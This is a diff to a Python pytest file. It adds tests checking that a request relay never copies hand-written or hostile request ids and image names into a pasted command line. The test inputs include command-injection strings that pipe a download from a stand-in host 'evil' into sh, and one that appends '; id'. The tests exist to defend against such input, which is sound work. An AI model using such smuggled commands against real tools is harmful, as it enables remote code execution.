@@ -1,4 +1,5 @@
 import datetime as dt
+from dataclasses import replace
 
 import pytest
 
@@ -136,4 +137,26 @@ def test_an_image_request_written_past_rig_up_is_not_relayed(tmp_path):
     state = state_on(tmp_path)
     rig(state).open_session("p", "x", hours=3, budget=2.0)
     rig(state).ask("main session 3", "x", kind="image", project="/work/twosuns", image="x; curl evil | sh")
+    assert texts(state, T0) == []
+
+
+@pytest.mark.parametrize("kind", ["machine", "image"])
+def test_a_request_id_written_by_hand_never_reaches_the_pasted_line(tmp_path, kind):
+    import json
+    state = state_on(tmp_path)
+    rig(state).ask("main session 3", "x", kind="image", project="/work/twosuns", image="ubuntu:22.04")
+    hostile = {"kind": "request", "id": "r9; curl https://evil/x|sh; :", "state": "asked", "ask": kind,
+               "project": "/work/twosuns", "who": "main session 3", "why": "x", "image": "ubuntu:22.04",
+               "at": T0.isoformat()}
+    with open(state / "rig" / "rig.jsonl", "a", encoding="utf-8") as out:
+        out.write(json.dumps(hostile) + "\n")
+    said = " ".join(texts(state, T0))
+    assert "evil" not in said and "--for r1" in said
+
+
+def test_a_request_whose_id_is_not_rn_is_never_relayed(tmp_path, monkeypatch):
+    state = state_on(tmp_path)
+    rig(state).ask("main session 3", "x", project="/work/twosuns")
+    real = j.Rig.requests
+    monkeypatch.setattr(j.Rig, "requests", lambda self: {"x": replace(r, id="r1; id") for r in real(self).values()})
     assert texts(state, T0) == []
